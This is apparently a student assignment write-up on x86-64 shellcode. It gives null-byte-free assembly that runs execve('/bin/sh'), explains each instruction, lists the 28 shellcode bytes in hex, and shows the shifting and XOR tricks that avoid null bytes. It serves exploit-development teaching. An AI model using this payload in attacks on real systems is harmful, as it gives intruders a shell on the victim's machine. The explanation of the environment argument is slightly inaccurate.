# Assignment 1

## Assembly Instructions:
```
.text
.global _start
_start:
        mov $0x01A1CCBDB9A588BC, %rbx 
        shr $2, %rbx
        push %rbx

        mov %rsp, %rdi
        xor %rsi, %rsi 
        xor %rdx, %rdx
        mov $59, %al

        syscall

```

## Instruction Explanation
- `mov $0x01A1CCBDB9A588BC, %rbx`

  &nbsp;&nbsp;&nbsp;&nbsp; Originally, "/bin/sh∅" in hex is: 0x0068732F6E69622F (Little Endian). In order to remove that null byte
  at the beginning of the number, I decided to left shift this number by two. This resulted in the 0x01A1CCBDB9A588BC being moved into RBX.

- `shr $2, %rbx`

  &nbsp;&nbsp;&nbsp;&nbsp; This instruction right shifts the number in RBX by 2 places. This brings the number in RBX to "/bin/sh∅", which is what we want.

- `push %rbx`

  &nbsp;&nbsp;&nbsp;&nbsp; Push the "/bin/sh∅" number to the stack. This so that we can pass a pointer to this string for the upcoming system call.

- `mov %rsp, %rdi`

  &nbsp;&nbsp;&nbsp;&nbsp; Take the stack pointer, which is currently pointing to the string "/bin/sh∅", and put this memory address into RDI. This is because for the upcoming system call, 'execve' expects to find a pointer to a string of what program we are to execute. In this case, we want to open a shell, so we pass in /bin/sh.

- `xor %rsi, %rsi` 
  
  &nbsp;&nbsp;&nbsp;&nbsp; Set RSI to 0. This is because 'execve' expects the arguments for the specified program (in RDI). In our case, we have no arguments to pass to /bin/sh, so we set it to 0.

- `xor %rdx, %rdx`

  &nbsp;&nbsp;&nbsp;&nbsp; Set RDX to 0. This is because 'execve' expects a pointer to environments to look through for the command passed in RDI. Because we pass the full path to sh (/bin/sh), we don't need any environments, so we set this register to 0.

- `mov $59, %al`

  &nbsp;&nbsp;&nbsp;&nbsp; Set RAX to 59. The number 59 denotes the system call 'execve' in the Linux operating system. This program replaces the current process with the specified program. In our case, it is the /bin/sh program, specified in RDI. We specify `%al` instead of `%rax` in order to tell the system to only replace the lowest byte. This removes extra null bytes in our machine code.

- `syscall`

  &nbsp;&nbsp;&nbsp;&nbsp; Make a system call. Tell the operating system to do some functionality -- based on what are in the pertinent registers. Namely, run a certain function based on what is in RAX ('execve' in our case), with the arguments found in RDI, RSI, and RDX.

  ## Final Shellcode
  My shellcode is 28 bytes long: 
  `48 BB BC 88 A5 B9 BD CC A1 01 48 C1 EB 02 53 48 89 E7 48 31 F6 48 31 D2 B0 3B 0F 05`

  ## Ensuring 0 Null Bytes
  In order to ensure that there were 0 null bytes in my final shell code, I had to make a couple of changes to my original assembly. The first and easiest was setting 0 for RSI and RDX. Intuitively, one would say `mov $0, %rsi`, but this leaves a null byte to denote that zero. To get around this, I XOR'd the register with itself, as anything XOR'd with itself is always zero. I did this for both RSI and RDX before the system call.

  The more complicated issue was denoting the final null byte in my "/bin/sh∅", which is necessary for the program to know when the string is over. I ended up solving this by shifting the entire number/string left by 2 bits. This make the null byte now 0x01. Then, in my assembly, I shifted the value right by 2 bits again to get by original and useful value. Because the assembly is telling the proccesor to shift right by two, the shellcode has no knowledge or storage of that final null byte, thereby removing the final null byte in my shellcode.
